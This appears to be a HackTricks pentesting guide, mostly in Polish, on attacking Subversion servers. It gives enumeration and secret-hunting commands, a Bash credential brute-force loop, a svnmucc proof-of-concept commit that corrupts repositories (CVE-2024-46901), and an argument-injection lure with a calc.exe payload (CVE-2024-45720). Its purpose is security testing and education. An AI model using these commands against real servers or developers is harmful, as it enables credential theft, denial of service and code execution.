# 3690/tcp - Pentesting Subversion (SVN) serwer

{{#include ../banners/hacktricks-training.md}}

## Podstawowe informacje

**Subversion (SVN)** to scentralizowany **system kontroli wersji** (licencja Apache) używany do wersjonowania oprogramowania i kontroli rewizji.

**Domyślny port:** `3690/tcp` (svnserve). Może być również udostępniany przez **HTTP/HTTPS** za pośrednictwem `mod_dav_svn` oraz przez **svn+ssh**.
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## Enumeracja
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### Uwierzytelnianie i wyszukiwanie błędów konfiguracji

- `svnserve.conf` może pozwalać na `anon-access = read` (a nawet write). Jeśli możesz listować, spróbuj `checkout`, aby zrzucić sekrety, skrypty, tokeny CI.
- Repozytoria często przechowują **build pipelines**, **deployment keys**, i **database credentials** w wersjonowanych plikach konfiguracyjnych. Przeszukaj working copy po checkout: `grep -R "password\|secret\|token" -n .`.
- Jeśli svn+ssh jest włączone, shelle użytkowników często pozwalają na ograniczone polecenia `svnserve`; spróbuj `ssh user@host svnserve -t` z spreparowanymi podpoleceniami, aby ominąć wrappery.

### Bruteforcing credentials (svnserve)

`Sasl` authentication (if enabled) and simple password files are protected only by the transport; no lockout by default. A quick Bash loop can try credentials:
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## Najnowsze podatności (praktyczny wpływ)

### mod_dav_svn DoS przez znaki sterujące (CVE-2024-46901)

- Użytkownik z prawami do commitowania może zapisać ścieżkę zawierającą znaki sterujące (np. `\x01`, `\x7f`), które **uszkadzają repozytorium**, powodując błędy przy późniejszych checkouts/logs i potencjalnie crashując workery `mod_dav_svn`.
- Dotyczy Subversion ≤ **1.14.4** przy serwowaniu przez **HTTP(S)** (`mod_dav_svn`). Naprawione w **1.14.5**.
- PoC commit za pomocą `svnmucc` (wymaga ważnych commit creds):
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- Po commicie normalni klienci mogą ulegać awarii lub odmawiać aktualizacji, dopóki administratorzy ręcznie nie usuną rewizji za pomocą `svnadmin dump/filter/load`.

### Windows argument injection in svn client (CVE-2024-45720)

- Na Windows, "best-fit" kodowanie znaków w `svn.exe` pozwala na **command-line argument injection** podczas przetwarzania specjalnie spreparowanych nie‑ASCII ścieżek/URLi, co może prowadzić do wykonania dowolnego programu.
- Dotyczy Subversion ≤ **1.14.3** tylko na Windows; naprawione w **1.14.4**. Powierzchnia ataku: phishing dewelopera, by uruchomił `svn` na URL/ścieżce kontrolowanej przez atakującego.
- Pentest angle: jeśli kontrolujesz udział sieciowy lub ZIP przekazany Windows devowi, nadaj URL repo lub ścieżkę working-copy zawierającą bajty best-fit, które dekodują się do argumentów w stylu `" & calc.exe & "`, a następnie nakłoń ofiarę do uruchomienia `svn status` lub podobnej komendy na tej ścieżce.

## Uwagi dotyczące procesu eksploatacji

1. Sprawdź metodę dostępu: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn) lub `svn+ssh://`.
2. Najpierw spróbuj anonimowego odczytu; następnie wykonaj spray common creds. Jeśli używany jest HTTP Basic, ponownie użyj creds znalezionych gdzie indziej.
3. Wyenumeruj hooks: skrypty `hooks/pre-commit`, `post-commit` czasem zawierają poświadczenia w plaintext lub nazwy hostów.
4. Wykorzystaj `svn:externals`, aby pobrać dodatkowe ścieżki z innych hostów; wyświetl je poleceniem `svn propget svn:externals -R .` po checkout.
5. Version leaks: nagłówki odpowiedzi HTTP od `mod_dav_svn` zwykle pokazują wersję Subversion i Apache; porównaj z 1.14.5, aby wykryć vuln targets.
6. Jeśli uzyskasz dostęp do systemu plików repo, `svnadmin dump`/`svnlook author`/`svnlook dirs-changed` umożliwiają analizę offline bez poświadczeń.

## Referencje

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
